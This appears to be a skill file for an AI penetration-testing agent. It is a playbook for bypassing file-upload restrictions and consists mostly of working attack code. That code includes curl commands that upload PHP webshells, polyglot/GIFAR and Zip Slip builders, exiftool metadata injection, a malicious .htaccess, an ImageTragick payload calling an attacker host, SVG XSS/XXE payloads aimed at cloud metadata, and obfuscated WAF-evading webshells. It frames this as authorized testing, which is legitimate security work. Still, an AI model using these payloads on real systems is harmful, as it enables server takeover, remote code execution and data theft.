---
id: file-upload-bypass
name: file-upload-bypass
description: >
  File upload restriction bypass techniques for authorized penetration tests. Covers MIME
  type spoofing, double/null-byte extensions, content-type manipulation, polyglot files
  (GIFAR), exiftool metadata injection, .htaccess upload for PHP execution, IIS short name
  exploitation, server-side validation bypass, and real CVE chains. Triggers on: file
  upload bypass, unrestricted file upload, MIME spoofing, double extension, null byte upload,
  polyglot file, GIFAR, exiftool inject, htaccess upload, webshell upload.
triggers:
  - file upload bypass
  - unrestricted file upload
  - MIME spoofing
  - double extension upload
  - null byte upload
  - polyglot file
  - GIFAR
  - exiftool inject
  - htaccess upload
  - webshell upload
  - content-type bypass
  - magic bytes bypass
---

# File Upload Restriction Bypass

## Authorization Gate

STOP. Confirm written authorization before testing any upload bypass. All TARGET references
are placeholders — substitute only in-scope systems.

---

## 1. Reconnaissance — Understanding the Upload Mechanism

### 1.1 Map the Upload Endpoint

```bash
# Capture the upload request in Burp Suite
# Key fields to note:
# - Content-Type of the multipart/form-data request
# - filename parameter value
# - Any hidden fields (nonces, tokens, allowed_types lists)
# - Server response revealing server-side language (X-Powered-By, Server headers)

# Check what file types are accepted (probe with benign files)
for ext in jpg png gif pdf txt php phtml php5 phar; do
  echo "Testing .$ext"
  curl -s -X POST https://TARGET/upload \
    -F "file=@/tmp/test.$ext;type=image/jpeg" \
    -F "token=CSRF_TOKEN" | grep -i 'error\|success\|invalid\|allowed'
done

# Check where uploaded files land
curl -s -X POST https://TARGET/upload -F "file=@test.jpg" | grep -oP 'http[s]?://[^ "]+\.(jpg|png|gif)'
# Note the path — /uploads/, /media/, /content/, /static/
```

### 1.2 Server-Side Technology Detection

```bash
# Detect server language (determines which extension achieves execution)
curl -I https://TARGET/
# X-Powered-By: PHP/8.1 → target .php, .phtml, .phar, .php5, .php7
# X-Powered-By: ASP.NET → target .asp, .aspx, .ashx, .asmx, .svc
# Server: Apache → .htaccess tricks possible
# Server: nginx → no .htaccess; look for path traversal

# Check error pages for technology leaks
curl -s https://TARGET/NONEXISTENT | grep -i 'php\|asp\|python\|ruby\|java'
```

---

## 2. MIME Type and Content-Type Bypass

### 2.1 Content-Type Spoofing

```bash
# Server checks Content-Type header only — change it in Burp or curl
# Bypasses: basic content-type validation that trusts client-supplied header

# PHP shell with image Content-Type
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -F "token=TOKEN"

# Alternative MIME types that may be accepted
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.php;type=image/gif"
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.php;type=image/png"
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.php;type=application/octet-stream"
```

### 2.2 Content-Type in Multipart — Burp Intercept Method

```
POST /upload HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← CHANGE THIS — server may only check this field

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

## 3. Extension Bypass Techniques

### 3.1 Double Extension

```bash
# If server blocks .php but allows image extensions:
# Upload file named shell.php.jpg
# On some Apache configs: files processed by first matching extension

# Create the double-extension file
cp shell.php shell.php.jpg
cp shell.php shell.php.png
cp shell.php shell.php.gif

# Also try reversed order (works on some servers that use last extension):
cp shell.php shell.jpg.php
cp shell.php shell.png.php

# PHP-specific alternates (if .php is blocked but these aren't):
for ext in phtml php3 php4 php5 php6 php7 phar shtml; do
  cp shell.php shell.$ext
  echo "Trying .$ext"
done
```

### 3.2 Case Variation

```bash
# Blocklist checks are often case-sensitive
cp shell.php shell.PHP
cp shell.php shell.Php
cp shell.php shell.PHp
cp shell.php shell.phP

# Burp Intruder — fuzz all case combinations
python3 -c "
word = 'php'
from itertools import product
for bits in product(*[(c.lower(), c.upper()) for c in word]):
    print('shell.' + ''.join(bits))
" > php_case_variants.txt
```

### 3.3 Null Byte Injection (Legacy PHP < 5.3.4, some older filters)

```bash
# PHP < 5.3.4 treats null byte as string terminator
# filename="shell.php%00.jpg" → PHP sees "shell.php"

# In Burp — intercept and modify filename parameter:
# Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# In curl (requires raw binary):
python3 -c "
import requests

files = {
    'file': ('shell.php\x00.jpg', open('shell.php', 'rb'), 'image/jpeg')
}
r = requests.post('https://TARGET/upload', files=files, data={'token': 'TOKEN'})
print(r.text)
"
```

### 3.4 Trailing Characters and Special Cases

```bash
# Trailing dot (Windows ignores trailing dots in filenames)
# filename="shell.php."
# filename="shell.php "  (trailing space)
# filename="shell.php::$DATA"  (NTFS Alternate Data Stream — Windows IIS)

# URL-encoded variations
# filename="shell%2Ephp"  (URL-encoded dot)
# filename="shell.ph%70"  (URL-encoded 'p')

# Unicode normalization bypass
# filename="shell.ｐhp"  (fullwidth p U+FF50) → normalized to 'p' on some systems
```

---

## 4. Magic Bytes (File Signature) Bypass

### 4.1 Prepend Magic Bytes to PHP Shell

```bash
# Server reads first bytes to determine file type — prepend valid image header

# GIF header + PHP shell
printf 'GIF89a' > polyglot.php
cat shell.php >> polyglot.php

# PNG header + PHP shell
printf '\x89PNG\r\n\x1a\n' > polyglot_png.php
cat shell.php >> polyglot_png.php

# JPEG header + PHP shell
printf '\xff\xd8\xff\xe0' > polyglot_jpg.php
cat shell.php >> polyglot_jpg.php

# Verify with file command
file polyglot.php
# Should show "GIF image data" — bypasses magic-byte checks

# Upload as .php if extension check passes, or as .php.gif for double bypass
```

### 4.2 GIFAR (GIF + JAR / GIF + PHP Polyglot)

```bash
# True polyglot: valid as two file formats simultaneously
# Classic GIFAR: file is valid GIF AND valid ZIP/JAR

# GIF+PHP polyglot — readable as GIF by image library, executed as PHP by server
cat > create_gifar.py << 'EOF'
# Creates a file that is a valid GIF AND contains PHP code
gif_header = b'GIF89a'  # GIF magic bytes
gif_minimal = gif_header + b'\x01\x00\x01\x00\x00\xff\x00' + b'\x2c'
gif_minimal += b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00\x3b'
php_payload = b'\n<?php system($_GET["cmd"]); ?>'

with open('gifar.php', 'wb') as f:
    f.write(gif_minimal + php_payload)

print("GIFAR created: gifar.php")
print("Valid GIF check:", gif_minimal[:6] == b'GIF89a')
EOF
python3 create_gifar.py
file gifar.php  # Confirms: GIF image data
```

---

## 5. Exiftool Metadata Injection

### 5.1 Inject PHP into Image Metadata

```bash
# ExifTool — inject PHP code into EXIF/IPTC metadata of legitimate image
# When server processes image with PHP's exif functions and includes the file,
# or when image is passed through include(), the PHP executes

# Inject into Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' legitimate.jpg
exiftool -Artist='<?php system($_GET["cmd"]); ?>' legitimate.jpg

# More stealthy — inject into GPS or other fields
exiftool -GPSLatitude='<?php system($_GET["cmd"]); ?>' legitimate.jpg

# Verify injection
exiftool -Comment legitimate.jpg

# ImageMagick alternative
convert legitimate.jpg -set comment '<?php system($_GET["cmd"]); ?>' injected.jpg

# After upload — if app does:
# <?php include($_GET['file']); ?>
# Call with: ?file=../uploads/injected.jpg
# PHP processes everything up to the first <?php tag as text, then executes
```

### 5.2 SVG File Upload — XSS and SSRF

```bash
# SVG files are XML — can contain JavaScript and external entity references
cat > payload.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <!-- XSS via onload -->
  <image onload="alert(document.domain)" href="x" />
  <!-- Alternative: script tag -->
  <script>alert(document.domain)</script>
  <!-- SSRF via external reference -->
  <image href="http://ATTACKER_SERVER/ssrf-hit" width="200" height="200"/>
</svg>
EOF

# Upload SVG and navigate to it
curl -s -X POST https://TARGET/upload \
  -F "file=@payload.svg;type=image/svg+xml"

# Blind SSRF via SVG
cat > ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
```

---

## 6. .htaccess Upload (Apache-Specific)

```bash
# If the upload directory has no .htaccess or allows overwrite:
# Upload a .htaccess that makes the server execute any extension as PHP

cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg .png .gif .txt
AddHandler php-script .jpg .png .gif .txt
Options +ExecCGI
EOF

# Step 1: Upload .htaccess
curl -s -X POST https://TARGET/upload \
  -F "file=@.htaccess;type=text/plain;filename=.htaccess"

# Step 2: Upload PHP shell with allowed extension (image)
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.php;filename=shell.jpg;type=image/jpeg"

# Step 3: Execute shell
curl "https://TARGET/uploads/shell.jpg?cmd=id"

# Variant: Force PHP execution with AddHandler
cat > .htaccess << 'EOF'
AddHandler php7-script .xxx
EOF
# Then upload shell.xxx
```

---

## 7. IIS-Specific Bypass Techniques

### 7.1 NTFS Alternate Data Stream

```bash
# Windows/IIS: file.asp::$DATA bypasses extension filters in some IIS versions
# IIS processes the ADS as the primary file

# In Burp, change filename to:
# filename="shell.asp::$DATA"
# filename="shell.aspx::$DATA"

# Also try:
# filename="shell.asp;.jpg"   (IIS semicolon parsing — IIS 5/6)
# filename="shell.asp;jpg"
```

### 7.2 IIS Semicolon Bypass (IIS 5.x and 6.x)

```bash
# IIS 5.x/6.x bug: path parsing stops at semicolon
# /uploads/shell.asp;.jpg → IIS executes as ASP

# Upload file with semicolon in name
curl -s -X POST https://TARGET/upload \
  -F "file=@shell.asp;filename=shell.asp;.jpg;type=image/jpeg"
```

---

## 8. Path Traversal in Filename

```bash
# Some upload handlers pass filename directly to file_put_contents() or similar
# Combine with path traversal to write outside the upload directory

# Try various traversal sequences in filename
declare -a traversals=(
  "../shell.php"
  "../../shell.php"
  "../../../var/www/html/shell.php"
  "..\shell.php"
  "..%2Fshell.php"
  "..%252Fshell.php"  # double URL encode
  "%2e%2e%2fshell.php"
  "....//shell.php"   # bypass /../ filter
)

for t in "${traversals[@]}"; do
  echo "Trying: $t"
  curl -s -X POST https://TARGET/upload \
    -F "file=@shell.php;filename=$t;type=image/jpeg" | head -3
done

# After traversal upload — probe webroot locations
for path in "" "shell.php" "../shell.php" "../../shell.php"; do
  curl -so /dev/null -w "%{http_code} - $path\n" "https://TARGET/$path"
done
```

---

## 9. Archive-Based Bypass (Zip Slip)

```bash
# If the server accepts ZIP/TAR archives and extracts them:
# Zip Slip — craft archive with path traversal filenames

pip install zipfile36 2>/dev/null

python3 << 'EOF'
import zipfile, os

# Create malicious zip with traversal filename
with zipfile.ZipFile('zipslip.zip', 'w') as zf:
    # ZipInfo with traversal in filename
    info = zipfile.ZipInfo('../../var/www/html/shell.php')
    zf.writestr(info, '<?php system($_GET["cmd"]); ?>')
    # Also add a legit file to look normal
    zf.writestr('image.jpg', b'\xff\xd8\xff\xe0' + b'\x00' * 100)

print("zipslip.zip created")
EOF

# Upload the zip
curl -s -X POST https://TARGET/upload \
  -F "archive=@zipslip.zip;type=application/zip"

# Then check if shell landed in webroot
curl -s "https://TARGET/shell.php?cmd=id"
```

---

## 10. Server-Side Validation Bypass — Chaining Techniques

### 10.1 Full Bypass Chain

```
Goal: upload PHP webshell to an endpoint that checks:
1. Content-Type header (client-controlled — trivial bypass)
2. File extension (blocklist — try alternates: phtml, phar, php5)  
3. Magic bytes (first N bytes) — prepend GIF89a
4. Image dimensions check (getimagesize()) — use actual image + appended PHP
5. Max file size — use minimal shell: <?php system($_GET[0]);?>

Step-by-step chain:
1. Start with a legitimate tiny GIF (1x1 pixel)
2. Append PHP payload after GIF binary
3. Rename to shell.phtml (or other alternate extension)
4. Set Content-Type: image/gif
5. Submit — passes all 5 checks
```

### 10.2 ImageMagick Processing Bypass

```bash
# If server re-processes images with ImageMagick (resize, convert):
# ImageMagick < 3.3.0 — ImageTragick (CVE-2016-3714) still on many servers
# MVG/MSL injection

cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://ATTACKER"|id > /tmp/pwned")'
pop graphic-context
EOF

# Rename to .png for upload
cp exploit.mvg exploit.png
curl -s -X POST https://TARGET/upload \
  -F "file=@exploit.png;type=image/png"

# Check if command executed
curl "https://TARGET/uploads/exploit.png"
```

---

## 11. WebShell Payloads

### 11.1 Minimal Webshells

```php
<?php system($_GET[0]);?>
<?php passthru($_REQUEST['x']);?>
<?php echo shell_exec($_POST['c']);?>
<?php eval(base64_decode($_POST['e']));?>
```

### 11.2 Obfuscated Webshells (WAF Evasion)

```php
<?php $f='sys'.'tem';$f($_GET[0]);?>
<?php $x=str_rot13('flfgrz');$x($_GET[0]);?>
<?php @preg_replace('/.*/e',$_POST[0],'');?>
<?php assert($_POST[0]);?>
<?php call_user_func('system',$_GET[0]);?>
```

### 11.3 ASP/ASPX Webshells

```asp
<%eval request("cmd")%>
```

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

---

## 12. CVE Examples — Real File Upload Vulnerabilities

| CVE | Product | Impact | Technique |
|---|---|---|---|
| CVE-2020-25213 | WP File Manager <= 6.9 | Unauth RCE | Direct shell upload, no auth required |
| CVE-2021-22941 | Citrix ShareFile | Auth RCE | Filename bypass + path traversal |
| CVE-2022-26352 | dotCMS | Unauth RCE | No content-type or extension validation |
| CVE-2023-27898 | Jenkins | Stored XSS→RCE | SVG upload with JavaScript |
| CVE-2024-4040 | CrushFTP | Unauth RCE | VFS path traversal in filename |
| CVE-2016-3714 | ImageMagick | RCE | MVG/MSL injection in image processing |

---

## 13. Testing Checklist

```
[ ] Identify upload endpoint and map all parameters
[ ] Determine server-side language (PHP/ASP/Java)
[ ] Test extension bypass: alternates, double, null byte, case
[ ] Test Content-Type bypass: image/* MIME types
[ ] Test magic bytes bypass: prepend GIF89a/PNG header
[ ] Test .htaccess upload (Apache)
[ ] Test path traversal in filename
[ ] Test SVG upload for XSS/SSRF/XXE
[ ] Test archive upload for Zip Slip
[ ] Check where uploaded files land (browseable? direct access?)
[ ] Verify shell execution after upload
[ ] Document CVSS score and business impact
```

---

## Related Skills

- `rce-specialist` — post-upload RCE escalation
- `xss-specialist` — SVG/HTML upload for XSS
- `xxe-specialist` — SVG/XML file upload for XXE
- `waf-bypass-techniques` — evading WAF rules during upload
- `recon-specialist` — finding hidden upload endpoints
